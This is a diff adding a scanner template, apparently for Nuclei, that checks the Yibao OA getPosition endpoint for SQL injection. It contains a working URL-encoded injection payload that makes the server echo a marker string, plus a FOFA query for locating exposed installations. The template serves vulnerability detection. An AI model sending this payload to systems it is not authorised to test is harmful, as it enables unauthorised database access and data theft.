@@ -1,0 +1,28 @@
+id: yibao-oa-getposition-sqli
+
+info:
+  name: 易宝OA系统 getPosition SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    易宝OA系统的/SmartTradeScan/StockTake/getPosition接口存在布尔盲注漏洞，攻击者可通过positionName参数获取数据库敏感信息
+    [漏洞发现时间：2025年7月]
+  metadata:
+    fofa-query: 'title="欢迎登录易宝OA系统"'
+  tags: 易宝OA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/SmartTradeScan/StockTake/getPosition?positionName=a1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm&stockRoomID=1&opeID=1&currentStatus=1&pickUpMode=11"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qbppq1qxzzq"  # 布尔盲注成功时的特定回显
+        part: body
+      - type: status
+        status:
+          - 200
